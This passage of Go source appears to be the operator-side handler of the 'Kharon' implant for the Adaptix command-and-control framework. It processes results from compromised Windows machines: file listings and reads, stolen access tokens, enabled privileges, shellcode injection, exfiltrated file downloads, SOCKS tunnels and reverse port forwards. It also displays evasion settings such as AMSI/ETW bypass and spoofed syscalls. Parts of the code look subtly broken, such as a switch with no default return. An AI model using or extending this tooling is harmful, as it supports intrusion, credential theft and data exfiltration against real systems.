							//				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
							//				task.MessageType = MESSAGE_ERROR

							type ls_data struct {
								filename   string
								size       uint
								attrib     uint
								dir        bool
								createDate string
								accessDate string
								writeDate  string
							}

							var data_directory []ls_data
							var data_files []ls_data

							if cmd_packer.CheckPacker([]string{"array"}) {

								rootPath := ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP)
								// rootPath, _ = strings.CutSuffix(rootPath, "\\*")

								for cmd_packer.CheckPacker([]string{"array", "int", "int", "word", "word", "word", "word", "word",
									"word", "word", "word", "word", "word", "word", "word", "word", "word", "word", "word", "word", "word"}) {

									ls_item := ls_data{
										filename:   ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP),
										size:       cmd_packer.ParseInt32(),
										attrib:     cmd_packer.ParseInt32(),
										dir:        false,
										createDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
										accessDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
										writeDate:  fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
									}

									if ls_item.filename != "." && ls_item.filename != ".." {
										if (ls_item.attrib & 0x10) != 0 {
											ls_item.dir = true
											data_directory = append(data_directory, ls_item)
										} else {
											data_files = append(data_files, ls_item)
										}
									}
								}

								var ui_items []adaptix.ListingFileDataWin

								data_full := append(data_directory, data_files...)
								if len(data_full) == 0 {
									task.Message = fmt.Sprintf("The '%s' directory is EMPTY", rootPath)
								} else {
									OutputText := fmt.Sprintf(" %-8s %-14s %-23s %-23s %-23s  %s\n", "Type", "Size", "Created               ", "Last Access           ", "Last Modified         ", "Name")
									OutputText += fmt.Sprintf(" %-8s %-14s %-23s %-23s %-23s  %s", "----", "---------", "-------------------   ", "-------------------   ", "-------------------   ", "----")

									for _, item := range data_full {

										if item.dir {
											OutputText += fmt.Sprintf("\n %-8s %-14s %-23s %-23s %-23s  %-8v", "dir", "", item.createDate, item.accessDate, item.writeDate, item.filename)
										} else {
											OutputText += fmt.Sprintf("\n %-8s %-14s %-23s %-23s %-23s  %-8v", "", SizeBytesToFormat(int64(item.size)), item.createDate, item.accessDate, item.writeDate, item.filename)
										}

										t, _ := time.Parse("02/01/2006 15:04:05", item.writeDate)

										fileData := adaptix.ListingFileDataWin{
											IsDir:    item.dir,
											Size:     int64(item.size),
											Date:     t.Unix(),
											Filename: item.filename,
										}
										ui_items = append(ui_items, fileData)
									}
									task.Message = fmt.Sprintf("List of files in the '%s' directory", rootPath)
									task.ClearText = OutputText
								}
								SyncBrowserFiles(ts, task, rootPath, ui_items)
							}

						case FS_PWD:
							if cmd_packer.CheckPacker([]string{"array"}) {
								task.Message = "Current working directory:"
								task.ClearText = ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP)
							}
							break

						case FS_CAT:
							if cmd_packer.CheckPacker([]string{"array"}) {
								task.Message = "File content:"
								task.ClearText = ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP)
							}
							break

						case FS_CD:
							if cmd_packer.CheckPacker([]string{"int"}) {
								if cmd_packer.ParseInt32() == 0 {
									task.Message = "Directory does not changed"
									task.MessageType = MESSAGE_ERROR
								} else {
									task.Message = "Directory successfully changed"
								}
							}
							break

						case FS_MOVE:
							if cmd_packer.CheckPacker([]string{"int"}) {
								if cmd_packer.ParseInt32() == 0 {
									task.Message = "File does not moved"
									task.MessageType = MESSAGE_ERROR
								} else {
									task.Message = "File successfully moved"
								}
							}
							break

						case FS_COPY:
							if cmd_packer.CheckPacker([]string{"int"}) {
								if cmd_packer.ParseInt32() == 0 {
									task.Message = "File does not copied"
									task.MessageType = MESSAGE_ERROR
								} else {
									task.Message = "File successfully copied"
								}
							}
							break

						case FS_RM:
							if cmd_packer.CheckPacker([]string{"int"}) {
								if cmd_packer.ParseInt32() == 0 {
									task.Message = "File does not removed"
									task.MessageType = MESSAGE_ERROR
								} else {
									task.Message = "File successfully removed"
								}
							}
							break

						case FS_MKDIR:
							if cmd_packer.CheckPacker([]string{"int"}) {
								if cmd_packer.ParseInt32() == 0 {
									task.Message = "Directory does not created"
									task.MessageType = MESSAGE_ERROR
								} else {
									task.Message = "Directory successfully created"
								}
							}
							break

						default:
							continue
						}
					}
					break
				case TASK_JOB:
					jobCount := cmd_packer.ParseInt32()

					if jobCount > 0 {
						for i := 0; i < int(jobCount); i++ {
							jobUUID := cmd_packer.ParseString()
							jobCmdId := cmd_packer.ParseInt32()
							jobState := cmd_packer.ParseInt32()

							if i == 0 {
								// Header
								format := "%-36s   %-12s   %-10s"
								OutputText := fmt.Sprintf(format, "Job UUID", "Command ID", "State")
								OutputText += fmt.Sprintf("\n"+format, strings.Repeat("-", 36), strings.Repeat("-", 12), strings.Repeat("-", 10))
								task.ClearText = OutputText + "\n"
							}

							// Job line
							stateStr := "Unknown"
							switch jobState {
							case 0:
								stateStr = "Running"
							case 1:
								stateStr = "Completed"
							case 2:
								stateStr = "Failed"
							}

							format := "%-36s   %-12d   %-10s"
							task.ClearText += fmt.Sprintf(format, jobUUID, jobCmdId, stateStr) + "\n"
						}
					} else {
						task.ClearText = "No jobs running"
					}
				case TASK_EXIT:

					task.Message = "The agent has completed its work"
					_ = ts.TsAgentTerminate(agentData.Id, task.TaskId)

				case TASK_GETINFO:

					// session info
					sleep_time := int(cmd_packer.ParseInt32())
					jitter_time := int(cmd_packer.ParseInt32())

					mask_tech_id := int(cmd_packer.ParseInt32())
					heap_obf := cmd_packer.ParseInt32()
					jmp_gadget := cmd_packer.ParseInt64()
					ntcont_gadget := cmd_packer.ParseInt64()

					bof_hook := cmd_packer.ParseInt32()
					syscall := int(cmd_packer.ParseInt32())
					amsietwbp := int(cmd_packer.ParseInt32())

					block_dlls := cmd_packer.ParseInt32()
					parent_pid := int(cmd_packer.ParseInt32())
					use_pipe := cmd_packer.ParseInt32()

					fork_pipe_name := cmd_packer.ParseString()
					fork_spawn_to := cmd_packer.ParseString()

					agent_id := cmd_packer.ParseString()
					img_name := cmd_packer.ParseString()
					img_path := cmd_packer.ParseString()
					cmd_line := cmd_packer.ParseString()
					process_id := int(cmd_packer.ParseInt32())
					thread_id := int(cmd_packer.ParseInt32())
					parent_id := int(cmd_packer.ParseInt32())
					elevated := cmd_packer.ParseInt32()
					h_heap := cmd_packer.ParseInt64()
					proc_arch := int(cmd_packer.ParseInt32())
					kh_start := cmd_packer.ParseInt64()
					kh_size := int(cmd_packer.ParseInt32())

					user_name := cmd_packer.ParseString()
					comp_name := cmd_packer.ParseString()
					domn_name := cmd_packer.ParseString()
					os_arch := cmd_packer.ParseInt8()
					os_major := cmd_packer.ParseInt32()
					os_minor := cmd_packer.ParseInt32()
					os_build := cmd_packer.ParseInt32()

					killdate_use := cmd_packer.ParseInt32()
					killdate_sdel := cmd_packer.ParseInt32()
					killdate_proc := cmd_packer.ParseInt32()
					killdate_day := cmd_packer.ParseInt32()
					killdate_mont := cmd_packer.ParseInt32()
					killdate_year := cmd_packer.ParseInt32()

					injection_alloc := cmd_packer.ParseInt32()
					injection_write := cmd_packer.ParseInt32()

					// Helper functions to format specific values
					maskTechStr := func(id int) string {
						switch id {
						case 1:
							return "Timer"
						case 2:
							return "Pooling"
						case 3:
							return "None"
						default:
							return fmt.Sprintf("%d", mask_tech_id)
						}
					}

					amsietwbpStr := func(id int) string {
						switch id {
						case 0x100: 
							return "All"
						case 0x700:
							return "AMSI"
						case 0x400: 
							return "ETW"
						case 0x000:
							return "None"
						}
					}

					syscallStr := func(sys int) string {
						switch sys {
						case 0:
							return "None"
						case 1:
							return "Spoof"
						case 2:
							return "Spoof + Indirect"
						default:
							return fmt.Sprintf("%d", syscall)
						}
					}

					boolStr := func(b uint) string {
						if b != 0 {
							return "True"
						}
						return "False"
					}

					// Formatting dates and versions
					killdateStr := fmt.Sprintf("%02d/%02d/%04d", killdate_day, killdate_mont, killdate_year)
					osVersionStr := fmt.Sprintf("%d.%d.%d", os_major, os_minor, os_build)

					w1, w2, w3 := 18, 18, 90

					border := "+" +
						strings.Repeat("-", w1+2) + "+" +
						strings.Repeat("-", w2+2) + "+" +
						strings.Repeat("-", w3+2) + "+\n"

					row := func(c1, c2, c3 string) string {
						return fmt.Sprintf("| %-*s | %-*s | %-*s |\n", w1, c1, w2, c2, w3, c3)
					}

					var b strings.Builder

					b.WriteString(border)

					// TIMING
					b.WriteString(row("TIMING", "Sleep Time", fmt.Sprintf("%dms", sleep_time)))
					b.WriteString(row("", "Jitter Time", fmt.Sprintf("%d", jitter_time)))
					b.WriteString(border)

					// EVASION
					b.WriteString(row("EVASION", "Mask Beacon", maskTechStr(mask_tech_id)))
					b.WriteString(row("", "Heap Mask", boolStr(heap_obf)))
					b.WriteString(row("", "Block DLLs", boolStr(block_dlls)))
					b.WriteString(row("", "Jump Gadget", fmt.Sprintf("0x%016X", jmp_gadget)))
					b.WriteString(row("", "NtContinue Gadget", fmt.Sprintf("0x%016X", ntcont_gadget)))
					b.WriteString(row("", "BOF API Proxy", boolStr(bof_hook)))
					b.WriteString(row("", "Syscall", syscallStr(syscall)))
					b.WriteString(row("", "AMSI/ETW Bypass", amsietwbpStr(amsietwbp)))
					b.WriteString(border)

					// INJECTION
					b.WriteString(row("INJECTION", "Allocation Method", fmt.Sprintf("%d", injection_alloc)))
					b.WriteString(row("", "Write Method", fmt.Sprintf("%d", injection_write)))
					b.WriteString(border)

					b.WriteString(row("SESSION", "Agent ID", agent_id))
					b.WriteString(row("", "Image Name", img_name))
					b.WriteString(row("", "Image Path", img_path))
					b.WriteString(row("", "Command Line", cmd_line))
					b.WriteString(row("", "Process ID", fmt.Sprintf("%d", process_id)))
					b.WriteString(row("", "Thread ID", fmt.Sprintf("%d", thread_id)))
					b.WriteString(row("", "Parent ID", fmt.Sprintf("%d", parent_id)))
					b.WriteString(row("", "Elevated", boolStr(elevated)))
					b.WriteString(row("", "Heap Handle", fmt.Sprintf("0x%016X", h_heap)))
					b.WriteString(row("", "Process Arch", fmt.Sprintf("0x%02X", proc_arch)))
					b.WriteString(row("", "Kharon Memory Base", fmt.Sprintf("0x%016X", kh_start)))
					b.WriteString(row("", "Kharon Memory Size", fmt.Sprintf("%d", kh_size)))
					b.WriteString(border)

					// FORK & SPAWN
					b.WriteString(row("FORK & SPAWN", "Parent PID", fmt.Sprintf("%d", parent_pid)))
					b.WriteString(row("", "Use Pipe", boolStr(use_pipe)))
					b.WriteString(row("", "Fork Pipe", fork_pipe_name))
					b.WriteString(row("", "Fork Spawn To", fork_spawn_to))
					b.WriteString(border)

					// SYSTEM INFO
					b.WriteString(row("SYSTEM INFO", "User Name", user_name))
					b.WriteString(row("", "Computer Name", comp_name))
					b.WriteString(row("", "Domain Name", domn_name))
					b.WriteString(row("", "OS Arch", fmt.Sprintf("0x%02X", os_arch)))
					b.WriteString(row("", "OS Version", osVersionStr))
					b.WriteString(border)

					// KILLDATE
					b.WriteString(row("KILLDATE", "Use Killdate", boolStr(killdate_use)))
					b.WriteString(row("", "Self Delete", boolStr(killdate_sdel)))
					b.WriteString(row("", "Kill Process", boolStr(killdate_proc)))
					b.WriteString(row("", "Date", killdateStr))
					b.WriteString(border)

					task.Message = "Received Information about Kharon"
					task.ClearText = b.String()

				case TASK_UPLOAD:
					// testjar := cmd_packer.ParseString()
					task.Message = "Initiated File Upload\n"
					task.ClearText = "This is Task.ClearText"

				case TASK_DOWNLOAD:
					file_id := cmd_packer.ParseString()
					status_code := cmd_packer.ParseInt32()
					if status_code != 0 {
						reason := cmd_packer.ParseString()
						task.Message = fmt.Sprintf("Download failed with error [%d]: %s", status_code, reason)
						task.MessageType = MESSAGE_ERROR
						continue
					}

					file_size := cmd_packer.ParseInt64()
					file_path := cmd_packer.ParseString()
					// file_bytes := cmd_packer.ParseBytes()

					_ = ts.TsDownloadAdd(agentData.Id, file_id, file_path, int(file_size))
					// _ = ts.TsDownloadUpdate(file_id, 1, file_bytes)

					// if params.Canceled {
					// 	task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
					// 	_ = ts.TsDownloadClose(fileId, 4)
					// } else {
					// _ = ts.TsDownloadClose(file_id, 3)
					// }

					task.Message = "Initiated File Download\n"
					task.Message += fmt.Sprintf("File ID: %s, File Path: '%s' download initiated, size: %d bytes", file_id, file_path, file_size)
					task.ClearText = "This is Task.ClearText"

				case TASK_PROCESS_DOWNLOAD:

					fmt.Printf("Processing TASK_PROCESS_DOWNLOAD results")

					event_num := cmd_packer.ParseInt32()
					fmt.Printf("Processing %d download events\n", event_num)

					for i := 0; i < int(event_num); i++ {

						file_id := cmd_packer.ParseString()
						status_code := cmd_packer.ParseInt32()
						fmt.Printf("Processing download event for file ID: %s, status_code: %d\n", file_id, status_code)

						if status_code != 0 {
							reason := cmd_packer.ParseString()
							task.Message += fmt.Sprintf("Download failed with error [%d]: %s\n", status_code, reason)
							task.MessageType = MESSAGE_ERROR
							fmt.Printf("Deleting fileID: %d\n", file_id)

							_ = ts.TsDownloadDelete(file_id)
							continue
						}

						file_size := cmd_packer.ParseInt32()
						file_bytes := cmd_packer.ParseBytes()
						cur_chunk := cmd_packer.ParseInt32()
						total_chunks := cmd_packer.ParseInt32()

						if cur_chunk == total_chunks {
							fmt.Printf("Processing TASK_PROCESS_DOWNLOAD results - Last Chunk")

							_ = ts.TsDownloadUpdate(file_id, 1, file_bytes)
							_ = ts.TsDownloadClose(file_id, 3)
							task.Message += fmt.Sprintf("File '%s' download completed, size: %d bytes\n", file_id, file_size)
						}else{
							_ = ts.TsDownloadUpdate(file_id, 1, file_bytes)
							task.Message += fmt.Sprintf("File '%s', Chunk: %d/%d download completed, size: %d bytes\n", file_id, cur_chunk, total_chunks, file_size)
						}


					}

				case TASK_TOKEN:
					if cmd_packer.CheckPacker([]string{"byte"}) {

						subCommandId := int(cmd_packer.ParseInt8())
						switch subCommandId {

						case TOKEN_GET_UUID:
							if cmd_packer.CheckPacker([]string{"array"}) {
								task.Message = ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP)
							}
							break

						case TOKEN_STEAL:
							if cmd_packer.CheckPacker([]string{"int"}) {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									task.Message = "Token could not be stolen"
								} else {

									if cmd_packer.CheckPacker([]string{"int", "int", "array", "array", "long"}) {
										tokenId := cmd_packer.ParseInt32()
										pid := cmd_packer.ParseInt32()
										user := cmd_packer.ParseString()
										host := cmd_packer.ParseString()
										handle := cmd_packer.ParseInt64()

										task.Message = fmt.Sprintf("Token %v (handle %v) from process [%v] in host [%v] successfully stolen: %v", tokenId, handle, pid, host, user)
									}
								}
							}
							break

						case TOKEN_USE:
							if cmd_packer.CheckPacker([]string{"int"}) {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									task.Message = "Token could not be used"
								} else {
									task.Message = "Token successfully used"
								}
							}
							break

						case TOKEN_RM:
							if cmd_packer.CheckPacker([]string{"int"}) {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									task.Message = "Token could not be removed"
								} else {
									task.Message = "Token successfully removed"
								}
							}
							break

						case TOKEN_REVERT:
							if cmd_packer.CheckPacker([]string{"int"}) {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									task.Message = "Token could not be reverted"
								} else {
									task.Message = "Token successfully reverted"
								}
							}
							break

						case TOKEN_MAKE:
							if cmd_packer.CheckPacker([]string{"int"}) {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									task.Message = "Token could not be created"
								} else {
									task.Message = "Token successfully created"
								}
							}
							break
						case TOKEN_LIST:
							var list string

							list += fmt.Sprintf("\n%-12s %-35s %-25s %-18s %-12s\n",
								"Token ID", "User", "Host", "Handle", "Process ID")
							list += fmt.Sprintf("%s\n", strings.Repeat("-", 120))

							for cmd_packer.Size() > 0 {
								user := cmd_packer.ParseString()
								host := cmd_packer.ParseString()
								tkn_id := cmd_packer.ParseInt32()
								handle := cmd_packer.ParseInt64()
								ps_id := cmd_packer.ParseInt32()

								list += fmt.Sprintf("%-12d %-35s %-25s 0x%-16X %-12d\n",
									tkn_id, user, host, handle, ps_id)
							}

							if list == "" {
								task.Message = "No tokens found"
							} else {
								task.ClearText = list
							}
						case TOKEN_PRIV_GET:
							if cmd_packer.CheckPacker([]string{"int"}) {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									task.Message = "Privileges could not be enabled"
								} else {
									task.Message = "Provileges successfully enabled"
								}
							}

						case TOKEN_PRIV_LIST:
							if cmd_packer.CheckPacker([]string{"int"}) {
								count := cmd_packer.ParseInt32()
								priv_len := 10

								type privelege struct {
									name string
									attr string
								}
								var privs []privelege
								for i := 0; i < int(count); i++ {
									if cmd_packer.CheckPacker([]string{"array", "int"}) {
										priv := privelege{
											name: ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP),
										}
										status := cmd_packer.ParseInt32()
										if status == 0 {
											priv.attr = "Disabled"
										} else {
											priv.attr = "Enabled"
										}
										if len(priv.name) > priv_len {
											priv_len = len(priv.name)
										}
										privs = append(privs, priv)
									}
								}

								if len(privs) == 0 {
									task.Message = "Privileges not found"
								} else {
									task.Message = "Privileges:\n"
									for _, priv := range privs {
										format := fmt.Sprintf("%%-%vv     %%v\n", priv_len)
										task.ClearText += fmt.Sprintf(format, priv.name, priv.attr)
									}
								}
							}

						default:
							continue
						}
					}
					break

				case TASK_CONFIG:
					task.Message = "Configuration changed\n"
					break

				case TASK_SCINJECT:
					task.Message = "Shellcode injected\n"
					break

				case TASK_EXEC_BOF:
					task.Completed = true

				case TASK_SOCKS:
					channelID := cmd_packer.ParseInt64()
					subCmd := cmd_packer.ParseInt64()
					result := cmd_packer.ParseInt16()
					fmt.Printf("Task_Socks - Recieved Data: channelID:%d, subCmd:%d, result: %d\n", channelID, subCmd, result)

					if channelID != 0 {
						if subCmd == COMMAND_TUNNEL_START_TCP {
							if result == 0 {
								ts.TsTunnelConnectionClose(int(channelID))
							} else {
								ts.TsTunnelConnectionResume(agentData.Id, int(channelID), false)
							}
						}
					}

				case TASK_PROCESS_TUNNEL:

					numEvents_COMMAND_TUNNEL_ACCEPT := cmd_packer.ParseInt32()
					if numEvents_COMMAND_TUNNEL_ACCEPT > 0 {
						fmt.Printf(" TASK_PROCESS_TUNNEL - numEvents_COMMAND_TUNNEL_ACCEPT: %d\n", numEvents_COMMAND_TUNNEL_ACCEPT)
					}

					for i := 0; i < int(numEvents_COMMAND_TUNNEL_ACCEPT); i++ {
						tunnelID := cmd_packer.ParseInt32()
						subCmd := cmd_packer.ParseInt32()
						fmt.Printf("Recieved Data: tunnelID:%d, subCmd:%d\n", tunnelID, subCmd)
						if tunnelID != 0 {
							if subCmd == COMMAND_TUNNEL_ACCEPT {
								revChannelID := cmd_packer.ParseInt32()
								fmt.Printf("Recieved Data: tunnelID:%d, revChannelID:%d\n", tunnelID, revChannelID)
								ts.TsTunnelConnectionAccept(int(tunnelID), int(revChannelID))
							}
						}
					}


					numEvents_COMMAND_TUNNEL_START_TCP := cmd_packer.ParseInt32()
					if numEvents_COMMAND_TUNNEL_START_TCP > 0 {
						fmt.Printf(" TASK_PROCESS_TUNNEL - numEvents_COMMAND_TUNNEL_START_TCP: %d\n", numEvents_COMMAND_TUNNEL_START_TCP)
					}

					for i := 0; i < int(numEvents_COMMAND_TUNNEL_START_TCP); i++ {
						channelID := cmd_packer.ParseInt32()
						subCmd := cmd_packer.ParseInt32()
						fmt.Printf("Recieved Data: channelID:%d, subCmd:%d\n", channelID, subCmd)
						if channelID != 0 {
							if subCmd == COMMAND_TUNNEL_START_TCP {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									ts.TsTunnelConnectionClose(int(channelID))
								} else {
									ts.TsTunnelConnectionResume(agentData.Id, int(channelID), false)
								}
							}
						}
					}

					numEvents_COMMAND_TUNNEL_WRITE_TCP := cmd_packer.ParseInt32()
					if numEvents_COMMAND_TUNNEL_WRITE_TCP > 0 {
						fmt.Printf("numEvents_COMMAND_TUNNEL_WRITE_TCP: %d\n", numEvents_COMMAND_TUNNEL_WRITE_TCP)
					}

					for i := 0; i < int(numEvents_COMMAND_TUNNEL_WRITE_TCP); i++ {
						channelID := cmd_packer.ParseInt32()
						subCmd := cmd_packer.ParseInt32()
						fmt.Printf("Recieved Data: channelID:%d, subCmd:%d\n", int(channelID), subCmd)
						if channelID != 0 {
							if subCmd == COMMAND_TUNNEL_WRITE_TCP {
								data := cmd_packer.ParseBytes()
								datalen := cmd_packer.ParseInt32()

								fmt.Printf("COMMAND_TUNNEL_WRITE_TCP: DATA LEN: %d\n", datalen)
								// Print packedData
								fmt.Printf("=== PACKED DATA DEBUG ===\n")
								fmt.Printf("Total bytes: %d\n", len(data))
								fmt.Printf("Hex dump:\n%s", hex.Dump(data))
								fmt.Printf("Raw hex: %x\n", data)
								fmt.Printf("========================\n\n")
								ts.TsTunnelConnectionData(int(channelID), data)
							}
						}
					}

				case TASK_RPORTFWD:
					var err error
					channelID := cmd_packer.ParseInt64()
					subCmd := cmd_packer.ParseInt64()
					result := cmd_packer.ParseInt16()
					fmt.Printf("TASK_RPORTFWD - Recieved Data: channelID:%d, subCmd:%d, result: %d\n", channelID, subCmd, result)

					if channelID != 0 {
						if subCmd == COMMAND_TUNNEL_REVERSE {
							if result == 0 {
								task.TaskId, task.Message, err = ts.TsTunnelUpdateRportfwd(int(channelID), false)
							} else {
								task.TaskId, task.Message, err = ts.TsTunnelUpdateRportfwd(int(channelID), true)
							}
							if err != nil {
								task.MessageType = MESSAGE_ERROR
							} else {
								task.MessageType = MESSAGE_SUCCESS
							}
						}
					}

				case TASK_ERROR:
					if cmd_packer.CheckPacker([]string{"int"}) {
						errorCode := cmd_packer.ParseInt32()
						// errorMessage := cmd_packer.ParseString()
						task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
						task.MessageType = MESSAGE_ERROR
					}
					break

				default:
					continue
				}

				outTasks = append(outTasks, task)
			}
		}
	}

	/// END CODE

	return outTasks
}

/// TUNNELS

func TunnelCreateTCP(channelId int, address string, port int) ([]byte, error) {

	protocol := "tcp"
	startFlag := 0

	array := []interface{}{TASK_SOCKS, int(startFlag), protocol, int(channelId), address, int(port)}

	fmt.Printf("TunnelCreateTCP\n")
	packedData, err := PackArray(array)

	if err != nil {
		goto RET
	}

RET:
	return packedData, err

	// return nil, errors.New("Function TCP Tunnel not supported")

}

func TunnelCreateUDP(channelId int, address string, port int) ([]byte, error) {
	return nil, errors.New("Function UDP Tunnel not supported")
}

func TunnelWriteTCP(channelId int, data []byte) ([]byte, error) {
	protocol := "tcp"
	startFlag := 1
	lenBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBytes, uint32(len(data)))
	result := append(lenBytes, data...)

	array := []interface{}{TASK_SOCKS, int(startFlag), protocol, int(channelId), int(len(data)), result}

	fmt.Printf("TunnelWriteTCP\n")
	packedData, err := PackArray(array)

	if err != nil {
		goto RET
	}

RET:
	return packedData, err
}

func TunnelWriteUDP(channelId int, data []byte) ([]byte, error) {
	return nil, errors.New("Function UDP Tunnel not supported")

}

func TunnelClose(channelId int) ([]byte, error) {
	startFlag := 2

	array := []interface{}{TASK_SOCKS, int(startFlag), int(channelId)}

	fmt.Printf("TunnelClose\n")
	packedData, err := PackArray(array)

	if err != nil {
		goto RET
	}

RET:
	return packedData, err

}

func TunnelReverse(tunnelId int, port int) ([]byte, error) {
	
	array := []interface{}{TASK_RPORTFWD, int(tunnelId), int(port)}

	fmt.Printf("TunnelReverse\n")
	packedData, err := PackArray(array)

	if err != nil {
		goto RET
	}

RET:
	return packedData, err
	// return nil, errors.New("Function TCP Tunnel not supported")

}

/// TERMINAL

func TerminalStart(terminalId int, program string, sizeH int, sizeW int) ([]byte, error) {
	return nil, errors.New("Function Remote Terminal not supported")
}

func TerminalWrite(terminalId int, data []byte) ([]byte, error) {
	return nil, errors.New("Function Remote Terminal not supported")
}

func TerminalClose(terminalId int) ([]byte, error) {
	return nil, errors.New("Function Remote Terminal not supported")
}
